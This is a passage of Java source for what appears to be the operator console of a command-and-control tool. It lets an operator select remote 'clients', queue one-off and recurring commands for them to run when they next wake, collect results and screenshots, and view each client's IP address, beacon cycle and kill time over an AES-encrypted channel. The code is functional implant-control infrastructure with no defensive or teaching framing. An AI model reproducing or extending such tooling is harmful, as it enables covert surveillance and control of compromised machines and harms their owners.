                                                Path target = Paths.get("Screenshots/" + client_id + "_" + time + ".jpg");
                                                
                                                if (!Files.exists(target)) {
                                                    
                                                    byte[] bytes = Base64.getDecoder().decode(rs[2]);
    
                                                    InputStream is = new ByteArrayInputStream(bytes);
                                                    BufferedImage newBi = ImageIO.read(is);
                                                    ImageIO.write(newBi, "jpg", target.toFile());
                                                }
    
                                                dec = "Image saved as <" + target.toAbsolutePath().toString() + ">.";
                                            }
                                            else {
                                                dec = Driver.run(new AESInput(rs[2], rs[3], false));
                                                dec = dec.replaceAll("\\\\n", System.lineSeparator()).replaceAll("\\\\r", "").replace("\"", "");
                                            }
    
                                            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'").format(Double.parseDouble(decimal.toPlainString()));
                                            builder.append("Client: " + client_id + "\nDate/Time: " + time + "\nCommand: " + rs[1] + "\n\n" + dec
                                                + "\n--------------------------------------------------------------------------------\n");
                                            
                                            sendEncrypted("sync");
                                            serverResponse = server_in.readLine();
                                            System.out.print(".");
                                        }
                                        System.out.println(". Downloaded ]\n");
            
                                        Path path = Paths.get("Results/" + client_id + "_" + getTime() + "_results.txt");
                                        RandomAccessFile file = new RandomAccessFile(path.toString(), "rw");
                                        file.writeBytes("================================================================================\nClient: " + client_id + "\n================================================================================\n" + builder.toString());
                                        System.out.println("See file <" + path.toAbsolutePath().toString() + "> for results.\n"
                                            + "\n--------------------------------------------------------------------------------\n");
                                        file.close();
            
                                        sendEncrypted("sync");
                                    }

                                    break;
                                case "help":
                                case "Help":
                                case "HELP":
                                case "h":
                                case "H":
                                case "7":
                                    // Help menu
                                    System.out.println(
                                          "  - {0} Exit:                         Exit the Results Menu and return to the Main Menu.\n"
                                        + "  - {1} Results Info:                 View info about the results (dates, amount, etc).\n"
                                        + "  - {2} View Last Result:             View the most recent result in the terminal.\n"
                                        + "  - {3} View Range of Results:        View a range of results in the terminal.\n"
                                        + "  - {4} View All Results:             View all stored results in the terminal.\n"
                                        + "  - {5} Download Range of Results:    Download a range of results in a txt file.\n"
                                        + "  - {6} Download All Results:         Download all stored results in a txt file.\n"
                                        + "  - {7} Help:                         Display this help menu.\n");

                                    break;
                                case "clear":
                                case "Clear":
                                case "CLEAR":
                                    // Clear the screen
                                    clearScreen();
            
                                    break;
                                default:
                                    // Invalid
                                    System.out.println(" [!] Invalid decision. Try 'help' or 'exit'.\n");
                            }
                            // Break from the while loop if "0" was selected
                            if (leaveNext) { break; }
                        }
                        System.out.println("================================================================================\n");
                        printMenu();

                        break;
                    case "8":
                        // Client info
                        sendEncrypted(decision);
                        for (String client_id : clients) {
                            serverResponse = receiveDecrypted();
                            if (serverResponse == null || serverResponse.equalsIgnoreCase("490 Client Info Not Found")) {
                                System.out.println("[!] Client info not found for " + client_id + ".\n");
                                System.out.println("--------------------------------------------------------------------------------\n");
                                sendEncrypted(decision);
                                continue;
                            }

                            String[] client_list = serverResponse.split(",");
                            SimpleDateFormat infoForm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss 'UTC'");
                            String creation = infoForm.format(new Date( (long) Float.parseFloat(client_list[2].trim())));
                            String last = infoForm.format(new Date( (long) Float.parseFloat(client_list[3].trim())));
                            String killtime = infoForm.format(new Date( (long) Float.parseFloat(client_list[6].trim())));
                            
                            System.out.println(
                                "Client Name:              " + client_list[0] + 
                                "\nIP Address:              " + client_list[1] + 
                                "\nCreation:                 " + creation + 
                                "\nLast Connection:          " + last + 
                                "\nServer Connection Cycle: " + client_list[4] + 
                                "s\nTime-Check Cycle:        " + client_list[5] + 
                                "s\nKilltime:                 " + killtime + "\n");
                            System.out.println("--------------------------------------------------------------------------------\n");
                            sendEncrypted(decision);
                        }

                        break;
                    case "9":
                        // Main menu
                        sendEncrypted(decision);
                        receiveDecrypted();
                        System.out.println("================================================================================\n");

                        // Show the startup menu
                        System.out.println("Start Menu Options:\n"
                            + "  0: Quit | 1: Select Client(s) | 2: Remove Client(s) | 3: Help\n");

                        while (true) {
                            boolean leaveNext = false;
                            System.out.print("start> ");
                            String choice = userInput.nextLine().strip();
                            System.out.println();

                            switch (choice) {
                                case "Quit":
                                case "quit":
                                case "QUIT":
                                case "q":
                                case "Q":
                                case "0":
                                    // Quit
                                    sendEncrypted("0");
                                    System.out.println("[ Terminating program ... Terminated ]");
                                    System.out.println("--------------------------------------------------------------------------------");

                                    userInput.close();
                                    disconnect();

                                    System.exit(0);

                                    break;
                                case "1":
                                    //Select client(s)
                                    sendEncrypted(choice);
                                    clientList = receiveDecrypted();

                                    ArrayList<String> newClients = getClients(clientList);
                                    if (newClients == null)
                                        continue;

                                    clients = newClients;
                                    leaveNext = true;

                                    break;
                                case "2":
                                    // Remove client(s)
                                    String choiceCpy = choice;
                                    System.out.print(" [!] WARNING: Removing a client deletes all data. Enter 'CONTINUE' to proceed:\n\nconfirm> ");
                                    choice = userInput.nextLine().strip();
                                    System.out.println();

                                    if (choice == null || !choice.equalsIgnoreCase("continue")) {
                                        System.out.println(" [!] Invalid input. Cancelling command.\n");
                                        continue;
                                    }

                                    sendEncrypted(choiceCpy);
                                    clientList = receiveDecrypted();

                                    ArrayList<String> removedClients = getClients(clientList);
                                    if (removedClients == null) {
                                        continue;
                                    }

                                    System.out.println("\n [!] Client(s) " + removedClients.toString() + " removed.\n");

                                    break;
                                case "help":
                                case "Help":
                                case "HELP":
                                case "h":
                                case "H":
                                case "3":
                                    // Help
                                    System.out.println(
                                        "  - {0} Quit:                        Kills the connection and terminates the program.\n"
                                        + "  - {1} Select Client(s):            Select client(s) from the database to manipulate.\n"
                                        + "  - {2} Remove Client(s):            Remove client(s) from the database (PERMANENT).\n"
                                        + "  - {3} Help:                        Display this help menu.\n");

                                    break;
                                case "clear":
                                case "Clear":
                                case "CLEAR":
                                    // Clear the screen
                                    clearScreen();

                                    break;
                                default:
                                    // Invalid
                                    System.out.println(" [!] Invalid decision. Try 'help' or 'quit'.\n");
                            }
                            if (leaveNext) { 
                                System.out.println("\n================================================================================\n");
                                break; 
                            }
                        }

                        break;
                    case "help":
                    case "Help":
                    case "HELP":
                    case "h":
                    case "H":
                    case "10":
                        // Help
                        System.out.println(
                              "  - {0}  Quit:                    Kills the connection and terminates the program.\n"
                            + "  - {1}  Queue Cmds:              Adds commands to a queue for the client to execute\n"
                            + "                                     upon its next awakening.\n"
                            + "  - {2}  View Cmd Queue:          View the commands queued for the client.\n"
                            + "  - {3}  Delete Cmd Queue:        Delete the commands queued for the client.\n"
                            + "  - {4}  Add Repeat Cmds:         Adds commands to be executed everytime the client\n"
                            + "                                     awakens (along with any in the queue).\n"
                            + "  - {5}  View Repeat Cmds:        View the set repeated commands.\n"
                            + "  - {6}  Delete Repeat Cmds:      Delete the set repeated commands.\n"
                            + "  - {7}  Results Menu:            Open the results menu (view, download, delete, etc).\n"
                            + "  - {8}  Client(s) Info:          View the general info about the client(s) (IP, cycles,\n"
                            + "                                     kill time, last connection, etc).\n"
                            + "  - {9}  Start Menu:              Return to the starting menu.\n"
                            + "  - {10} Help:                    Display this help menu.\n");

                        break;
                    case "clear":
                    case "Clear":
                    case "CLEAR":
                        // Clear the screen
                        clearScreen();

                        break;
                    default:
                        // Invalid
                        System.out.println(" [!] Invalid decision. Try 'help' or 'quit'.\n");
                }
            }
        }
        catch (Exception e) {
            System.out.println("\n[ ERROR: " + e.getMessage() + " ]");
            System.out.println("[ Terminating program ... Terminated ]");
            System.out.println("--------------------------------------------------------------------------------");
        }
    }

    /**
     * Clears the console window and resets cursor.
     */
    private static void clearScreen() {  
        System.out.println(new String(new char[50]).replace("\0", "\r\n"));  
    }

    /**
     * Prints the menu to the screen.
     */
    private static void printMenu() {
        System.out.println(
              "Main Menu Options:\n"
            + "  0: Quit | 1: Queue Cmds | 2: View Cmd Queue | 3: Delete Cmd Queue\n"
            + "  4: Add Repeat Cmds | 5: View Repeat Cmds | 6: Delete Repeat Cmds\n"
            + "  7: Results Menu | 8: Client(s) Info | 9: Start Menu | 10: Help\n");
    }

    /**
     * Returns a String representation of the current system time, of the form:
     * 
     *  [yyyy-MM-dd HH:mm:ss]
     */
    private static String getTime() {
        Date date = new Date(System.currentTimeMillis());
        return new SimpleDateFormat("yyyy-MM-dd'_'HHmmss").format(date);
    }

    /**
     * Encrypts input before being sent to the operator.
     * 
     * upload = FA4
     * 
     * @param str   the string to encrypt and send
     */
    private static void sendEncrypted(String str) {
        // // Deal with upload case
        // String uploadString = "";
        // if(str.contains("upload ")) {
        //     String[] cmds = str.split("\\|");
        //     int curr = 0;
        //     boolean anyOtherCommands = false;
        //     for(int i = cmds.length - 1; i >= 0; i--) {
        //         if(cmds[i].startsWith("upload")) {
        //             String upl = "FA4";
        //             String[] tempSplit = cmds[i].split(" ");
        //             cmds[i] = upl + extensions.get(tempSplit[1].split("\\.")[1]) + tempSplit[2];
        //         }
        //         else {
        //             curr = i;
        //             anyOtherCommands = true;
        //             break;
        //         }
        //     }
        //     // Store everything back in str except upload commands
        //     if(anyOtherCommands) {
        //         str = "|";
        //         for(int i = 0; i <= curr; i++) {
        //             str += cmds[i] + "|";
        //         }
        //     }
        //     else {
        //         str = "";
        //     }
        //     // Store encrypted upload commands separately
        //     if(anyOtherCommands) {
        //         curr++;
        //     }
        //     for(int i = curr; i < cmds.length; i++) {
        //         uploadString += cmds[i] + "|";
        //     }
        // }
        // String encrypted = "";
        // if(!str.equals("")) {
        //     AESInput input = new AESInput(str, key, true);
        //     encrypted = Driver.run(input) + uploadString;
        // }
        // else {
        //     encrypted = uploadString;
        // }

        AESInput input = new AESInput(str, key, true);
        String encrypted = Driver.run(input);
        server_out.println(encrypted);
    }

    /**
     * Receives and decrypts a message from the operator.
     * 
     * @return a decrypted string from the operator
     */
    private static String receiveDecrypted() throws Exception {
        String encrypted = server_in.readLine();
        AESInput input = new AESInput(encrypted, key, false);
        return Driver.run(input);
    }

    /**
     * Closes all I/O buffers and connections to the Server.
     */
    private static void disconnect() throws Exception {
        server_in.close();
        server_out.close();
        socket.close();
    }

    /**
     * Display the available clients and get the user's choice.
     * 
     * @param clientList    a list of available clients (from the server)
     * 
     * @return an ArrayList containing all chosen clients
     */
    private static ArrayList<String> getClients(String clientList) throws Exception {
        if (clientList.equalsIgnoreCase("No Known Clients.")) {
            System.out.println(" [!] No Known Clients. Create one using Creation Wizard.\n");
            return null;
        }

        // Get the desired client(s) from the user
        System.out.println("Available Clients: " + clientList);
        System.out.println("\n [!] Enter clients separated by commas (or type 'all' or 'cancel'):");
        String client = "";
        while (true) {
            System.out.print("\nclient> ");
            client = userInput.nextLine();

            if (client.equalsIgnoreCase("cancel") || client.equalsIgnoreCase("c") || client.equals("0")) {
                System.out.println("\n [!] Selection Cancelled.\n");
                sendEncrypted("null");
                receiveDecrypted();
                return null;
            }

            if (client.equalsIgnoreCase("all")) {
                client = clientList;
            }

            sendEncrypted(client.replaceAll("\\s+",""));
            String serverResponse = receiveDecrypted();
            if (serverResponse.startsWith("480")) {
                String invalid = serverResponse.split("\\|")[1];
                System.out.println("\n [!] Invalid decision (" + invalid + "). Select from avaliable clients.");
                continue;
            }
            break;
        }

        return new ArrayList<>(Arrays.asList(client.split(", ")));
    }

    /**
     * Prompt user input for Year, Month, Day, Hour, Minute, Second, then convert
     * to epoch time.
     * 
     * @param notPast   true iff time can only be present or future, false if time
     *                  can also be in the past
     * 
     * @return a converted date and time to epoch time, as a long
     */
    private static long getDateToEpoch(boolean notPast) throws Exception {

        int year, month, day, hour, minute, second;
        Calendar cal = Calendar.getInstance();
        int currYear = cal.get(Calendar.YEAR);
        int currMonth = cal.get(Calendar.MONTH) + 1;
        int currDay = cal.get(Calendar.DATE);
        int currHour = cal.get(Calendar.HOUR_OF_DAY);
        int currMin = cal.get(Calendar.MINUTE);
        int currSec = cal.get(Calendar.SECOND);

        System.out.println(String.format(" [!] Current Date/Time: %04d-%02d-%02d %02d:%02d:%02d UTC\n", currYear, currMonth, currDay, currHour, currMin, currSec));

        // Get year
        while (true) {
            System.out.print("   - Enter Year: ");
            String ans = userInput.nextLine().strip();
            try {
                year = Integer.parseInt(ans);
                if (notPast && year < currYear) {
                    System.out.println("     [!] Invalid input: year is in the past");
                    continue;
                }
                break;
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Get month
        while (true) {
            System.out.print("   - Enter Month: ");
            String ans = userInput.nextLine().strip();
            try {
                month = Integer.parseInt(ans);
                if (month < 1 || month > 12) {
                    System.out.println("     [!] Invalid input: month must be in range [1-12]");
                    continue;
                }
                if (notPast && month < currMonth && year <= currYear) {
                    System.out.println("     [!] Invalid input: month is in the past");
                    continue;
                }
                break;
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Get day
        while (true) {
            System.out.print("   - Enter Day: ");
            String ans = userInput.nextLine().strip();
            ArrayList<Integer> longMonths = new ArrayList<>(Arrays.asList(1, 3, 5, 7, 8, 10, 12));
            try {
                day = Integer.parseInt(ans);
                if (longMonths.contains(month) && (day < 1 || day > 31)) {
                    System.out.println("     [!] Invalid input: day must be in range [1-31]");
                    continue;
                }
                else if (month == 2) {
                    if (year % 4 == 0 && (day < 1 || day > 29)) {
                        System.out.println("     [!] Invalid input: day must be in range [1-29]");
                        continue;
                    }
                    else if (day < 1 || day > 28) {
                        System.out.println("     [!] Invalid input: day must be in range [1-28]");
                        continue;
                    }
                }
                else if (day < 1 || day > 30) {
                    System.out.println("     [!] Invalid input: day must be in range [1-30]");
                    continue;
                }

                if (notPast && day < currDay && month <= currMonth && year <= currYear) {
                    System.out.println("     [!] Invalid input: day is in the past.");
                    continue;
                }
                break;                
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Get hour
        while (true) {
            System.out.print("   - Enter Hour: ");
            String ans = userInput.nextLine().strip();
            try {
                hour = Integer.parseInt(ans);
                if (hour < 0 || hour > 23) {
                    System.out.println("     [!] Invalid input: hour must be in range [0-23]");
                    continue;
                }
                if (notPast && hour < currHour && day <= currDay && month <= currMonth && year <= currYear) {
                    System.out.println("     [!] Invalid input: hour is in the past");
                    continue;
                }
                break;
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Get minute
        while (true) {
            System.out.print("   - Enter Minute: ");
            String ans = userInput.nextLine().strip();
            try {
                minute = Integer.parseInt(ans);
                if (minute < 0 || minute > 59) {
                    System.out.println("     [!] Invalid input: minute must be in range [0-59]");
                    continue;
                }
                if (notPast && minute < currMin && hour <= currHour && day <= currDay && month <= currMonth && year <= currYear) {
                    System.out.println("     [!] Invalid input: minute is in the past");
                    continue;
                }
                break;
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Get second
        while (true) {
            System.out.print("   - Enter Second: ");
            String ans = userInput.nextLine().strip();
            System.out.println();
            try {
                second = Integer.parseInt(ans);
                if (second < 0 || second > 59) {
                    System.out.println("     [!] Invalid input: second must be in range [0-59]");
                    continue;
                }
                if (notPast && second < currSec && minute <= currMin && hour <= currHour && day <= currDay && month <= currMonth && year <= currYear) {
                    System.out.println("     [!] Invalid input: second is in the past");
                    continue;
                }
                break;
            }
            catch (NumberFormatException e) {
                System.out.println("     [!] Invalid input: not a number.");
            }
        }

        // Convert to epoch
        TimeZone tz = cal.getTimeZone();
        String zone = tz.getDisplayName(false, TimeZone.SHORT);
        String strDate = String.format("%04d-%02d-%02d %02d:%02d:%02d %s", year, month, day, hour, minute, second, zone);

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z");
        java.util.Date date = dateFormat.parse(strDate);
        long epoch = date.getTime();

        System.out.println(" [!] Date/Time: " + strDate + " (Epoch: " + epoch + ")\n");
        return epoch;
    }
}
